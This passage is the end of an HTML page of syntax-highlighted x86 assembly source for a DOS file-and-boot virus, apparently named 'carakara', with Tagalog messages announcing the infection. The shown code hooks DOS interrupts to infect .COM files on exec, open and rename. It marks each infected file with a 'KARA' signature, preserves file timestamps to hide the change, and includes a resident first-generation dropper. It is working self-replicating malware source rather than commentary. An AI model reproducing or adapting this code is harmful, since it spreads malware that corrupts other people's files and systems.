         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
 </span><span class="sc5">_pop_a</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">                  </span><span class="sc1">; end of message</span><span class="sc0">
 </span><span class="sc5">_pop_b</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">_pop_b</span><span class="sc0">                  </span><span class="sc1">; infinite loop!!!!!!</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">_pop_a</span><span class="sc0">
 
 </span><span class="sc1">;-----------------------------------</span><span class="sc0">
 </span><span class="sc1">;--- mess popper message -----------</span><span class="sc0">
 </span><span class="sc1">;-----------------------------------</span><span class="sc0">
 
 </span><span class="sc5">_txt_1</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Ang disk mo ay inpektado'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'I-boot mo uli'</span><span class="sc0">
 </span><span class="sc5">_txt_2</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Klandistino'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Awto'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Reproduktibo'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Antibayrus'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">
 
 </span><span class="sc5">_is_err</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; int 24 handler</span><span class="sc0">
         </span><span class="sc6">iret</span><span class="sc0">
 
 </span><span class="sc1">;-----------------------------------</span><span class="sc0">
 </span><span class="sc1">;--- boot virus in memory message --</span><span class="sc0">
 </span><span class="sc1">;-----------------------------------</span><span class="sc0">
 </span><span class="sc5">_txt_3</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'May bayrus sa memorya$'</span><span class="sc0">
 
 
 </span><span class="sc5">_13_int</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; int 13 routine</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc5">_13_a</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">62h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">_13_b</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">62h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">_13_a</span><span class="sc0">
 </span><span class="sc5">_13_b</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">_save</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'HEXFILES'</span><span class="sc0">              </span><span class="sc1">; this should be 8 bytes</span><span class="sc0">
 
 </span><span class="sc5">_is_dos</span><span class="sc4">:</span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">; my file infector</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0">                  </span><span class="sc1">; exec</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">_gro_1</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">                  </span><span class="sc1">; file open</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">_gro_1</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">                  </span><span class="sc1">; file attribute</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">_gro_1</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc0">                  </span><span class="sc1">; rename file</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">_gro_1</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">63h</span><span class="sc0">                     </span><span class="sc1">; execute int 21</span><span class="sc0">
         </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">                       </span><span class="sc1">; return to caller</span><span class="sc0">
 
 </span><span class="sc5">_gro_1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pusha</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; get end of file spec</span><span class="sc0">
 </span><span class="sc5">_gro_2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">_gro_2</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; com checker</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">                </span><span class="sc1">; only checks if .co</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'oc'</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">_gro_3</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">_gro_8</span><span class="sc0">
 </span><span class="sc5">_gro_3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2461h</span><span class="sc0">                </span><span class="sc1">; save and reset int 24</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_savect</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_is_err</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_setint</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                </span><span class="sc1">; get file attribute</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">63h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                </span><span class="sc1">; clear file attribute</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">63h</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">_gro_7</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                </span><span class="sc1">; open file</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">63h</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">_gro_6</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; prepare for infect check</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_save</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">63h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; is file infected?</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'AK'</span><span class="sc0">                 </span><span class="sc1">; check if KARA is in file's</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">_gro_4</span><span class="sc0">                  </span><span class="sc1">;   4th to 7th byte</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'R'</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">_gro_5</span><span class="sc0">
 </span><span class="sc5">_gro_4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                </span><span class="sc1">; get file length</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">63h</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4096</span><span class="sc0">                 </span><span class="sc1">; 4 kb?</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">_gro_5</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                    </span><span class="sc1">; set up offsets</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">_temp_a</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; start of virii</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">103h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">_temp_b</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; jump displacement</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_save</span><span class="sc4">)+</span><span class="sc2">103h</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">_init</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; location of victim code</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">_vir_len</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write virii</span><span class="sc0">
         </span><span class="sc6">cwd</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">63h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">63h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write jumper and sig</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_start</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">63h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">; preserve file time and date</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">63h</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">63h</span><span class="sc0">
 </span><span class="sc5">_gro_5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                  </span><span class="sc1">; close file</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">63h</span><span class="sc0">
 </span><span class="sc5">_gro_6</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                </span><span class="sc1">; restore attribute</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">63h</span><span class="sc0">
 </span><span class="sc5">_gro_7</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6124h</span><span class="sc0">                </span><span class="sc1">; restore int 24</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_savect</span><span class="sc0">
 </span><span class="sc5">_gro_8</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">popa</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">                                    
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">63h</span><span class="sc0">                     </span><span class="sc1">; execute int 21</span><span class="sc0">
         </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">                       </span><span class="sc1">; return to caller</span><span class="sc0">
 
 </span><span class="sc5">_conta</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                        </span><span class="sc1">; disk read counter</span><span class="sc0">
 
 </span><span class="sc5">_boot</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">            </span><span class="sc1">; read boot buffer</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------</span><span class="sc0">
 </span><span class="sc1">;--- first generation ------------------</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------</span><span class="sc0">
                                         </span><span class="sc1">; first generation codes</span><span class="sc0">
                                         </span><span class="sc1">; is a simplified version</span><span class="sc0">
                                         </span><span class="sc1">; of _init routine</span><span class="sc0">
                                         </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">persgen</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc2">0beh</span><span class="sc0"> </span><span class="sc1">; put mov si,xxxx opcode to </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; virii start, operand is set</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">                  </span><span class="sc1">; by virii on infection</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                      
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">_mem_need</span><span class="sc0">            </span><span class="sc1">; we need a separate first</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; generation because of </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">                  </span><span class="sc1">; the structure of the</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; virii entry point.</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">persgen</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">     
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3513h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">62h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">62h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">63h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">63h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">cli</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_is_dos</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_is_dsk</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2513h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
 
 </span><span class="sc5">carakara</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">
 
  </span><span class="sc9">end</span><span class="sc0">  </span><span class="sc5">_init</span></div></body>
</html>
